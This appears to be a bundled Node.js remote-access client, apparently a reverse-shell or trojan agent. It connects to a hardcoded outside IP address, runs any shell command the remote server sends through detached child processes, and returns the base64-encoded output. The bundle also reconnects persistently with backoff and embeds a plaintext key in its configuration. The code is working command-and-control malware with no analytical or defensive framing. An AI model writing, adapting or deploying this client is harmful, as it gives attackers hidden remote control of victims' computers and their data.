(function e(t,n,r){function s(o,u){if(!n[o]){if(!t[o]){var a=typeof require=="function"&&require;if(!u&&a)return a(o,!0);if(i)return i(o,!0);var f=new Error("Cannot find module '"+o+"'");throw f.code="MODULE_NOT_FOUND",f}var l=n[o]={exports:{}};t[o][0].call(l.exports,function(e){var n=t[o][1][e];return s(n?n:e)},l,l.exports,e,t,n,r)}return n[o].exports}var i=typeof require=="function"&&require;for(var o=0;o<r.length;o++)s(r[o]);return s})({1:[function(require,module,exports){
var net = require('net');
var crypto = require('./utils/crypto');
var delay = require('./utils/delay');
var config = require('./config.json');
var parser = require('./utils/parser');
var logger = require('./utils/logger');
var Packet = require('./models/packet')
var spawn = require('child_process').spawn;

var sender_id;
var receiver_id;
var baseSocket;
var socketOpen = false;

function openSocket() {
    try {
        if (!socketOpen) {
            baseSocket = net.connect({
                port: config.port,
                host: config.host
            });
            baseSocket.setKeepAlive(true);
            baseSocket.setEncoding(config.default_encoding);
            baseSocket.on('connect', onConnect.bind({}, baseSocket));
            baseSocket.on('error', destroySocket.bind({}, baseSocket));
            baseSocket.on('data', onData.bind({}, baseSocket));
            baseSocket.on('close', destroySocket.bind({}, baseSocket));
            socketOpen = true;
        }
    } catch (err) {
        console.log(`error: ${err}`);
    }
}
var onConnect = function() {
    console.log('-> SERVER : Succesfully connected');
};

var onData = function(socket, data) {
    if (!parser.isValid(data)) {
        return;
    }
    var packet = parser.decode(data);
    receiver_id = packet.sender_id;
    sender_id = packet.receiver_id;
    processPacket(packet);
};
var send = function(data) {
    let parsedPacket = parser.encode(data);
    console.log(`raw Packet: ${data}`);
    console.log(`parsed Packet: ${parsedPacket}`);
    baseSocket.write(parsedPacket);
};
var destroySocket = function() {
    // Kill socket
    if (socketOpen) {
        console.log('Killing socket');
        baseSocket.end();
        baseSocket.destroy();
        baseSocket.unref();
        socketOpen = false;
    }

    // Re-open socket
    var timeout = setTimeout(openSocket, delay.get());
};

var processPacket = function(packet) {
    //var parsedPacket = parser.decode(packet);
    for (let cmd in packet.data) {
        processCommand(cmd, packet.data[cmd], packet);
    }
};

var childObject;
var processCommand = function(cmd, cmdData) {
    if (cmd === 'cmd') {
        var output;

        console.log(`cmdData ${cmdData}`);

        var splitted = cmdData.split(' ');
        console.log(`splitted: ${splitted}`);
        var firstElement = splitted[0];
        splitted.shift();
        var args = splitted;
        console.log(`args: ${args}`);
        if (args === firstElement) args = [];
        childObject = spawn(firstElement, args, {
            detached: true
        });

        childObject.stdout.setEncoding('utf8');
        childObject.stdout.on('data', function(data) {
            console.log('stdout: ' + data);
            output = data;
            var toSend = new Packet(sender_id, receiver_id, {
                output: new Buffer(output).toString('base64')
            });
            send(toSend);
        });
    } else if (cmd === "sig") {
        childObject.kill();
    } else if (cmd === "ack") {
        var toSend = new Packet(sender_id, receiver_id, {
            name: "TOM"
        });
        send(toSend);
    }
};

openSocket();

},{"./config.json":2,"./models/packet":3,"./utils/crypto":4,"./utils/delay":5,"./utils/logger":6,"./utils/parser":7,"child_process":undefined,"net":undefined}],2:[function(require,module,exports){
module.exports={
  "host":"213.118.206.29",
  "port":8080,
  "default_encoding":"utf8",
  "token":"test",
  "encryption_key":"T&V^8a9D*HV!njTbcEr*",
  "logmode":"dev",
  "reconnect_delay_min":1000,
  "reconnect_delay_step_multiply":2,
  "reconnect_delay_max":60000
}

},{}],3:[function(require,module,exports){
"use strict";
class Packet {
    constructor(sender_id,receiver_id, data){
        this.sender_id = sender_id;
        this.receiver_id = receiver_id;
        this.data = data;
    }
}
Packet.fromJSON = function(json){
    return new Packet(json.sender_id,json.receiver_id, json.data)
};

module.exports= Packet;

},{}],4:[function(require,module,exports){
var config = require('../config.json');
var crypto = require('crypto'),
    algorithm = 'aes-256-ctr',
    password = config.encryption_key;

module.exports.encrypt = function(text) {
    return text;
};

module.exports.decrypt = function(text) {
    return text
};

},{"../config.json":2,"crypto":undefined}],5:[function(require,module,exports){
var config = require('../config.json');

module.exports = function(){
    const MIN_DELAY = config.reconnect_delay_min;
    const MAX_DELAY = config.reconnect_delay_max;

    const RECONNECT_DELAY_STEP = config.reconnect_delay_step_multiply;
    var currentDelay = MIN_DELAY;

    var get = function(){
        let oldCurrentDelay = currentDelay;

        let newCurrentDelay = currentDelay*RECONNECT_DELAY_STEP;

        if(newCurrentDelay >= MAX_DELAY){
            newCurrentDelay = MAX_DELAY;
        }

        currentDelay = newCurrentDelay;
        return oldCurrentDelay;
    };
    var reset = function(){
        currentDelay = MIN_DELAY;
    };

    return {
        reset: reset,
        get: get
    }
}();
},{"../config.json":2}],6:[function(require,module,exports){
(function(){
    // Save the original method in a private variable
    var _privateLog = console.log;
    // Redefine console.log method with a custom function
    console.log = function (message) {
        var date = new Date();
        var dateString = `${date.toLocaleString()}`;

        var output = `${dateString} :: ${arguments['0']}`;
        _privateLog.call(console, output);
    };
})();

},{}],7:[function(require,module,exports){
"use strict";
var Packet = require('../models/packet');


module.exports.isValid = function(packet) {
    try {
        Packet.fromJSON(JSON.parse(packet));
        return true;
    } catch (e) {
        return false;
    }
};

module.exports.decode = function(packet) {
    let temp = Packet.fromJSON(JSON.parse(packet));
    // temp.data = new Buffer(packet.data, 'base64').toString('utf8');
    return temp;
};

module.exports.encode = function(packet) {
    // packet.data = new Buffer(packet.data).toString('base64');
    return JSON.stringify(packet);
};

},{"../models/packet":3}]},{},[1]);
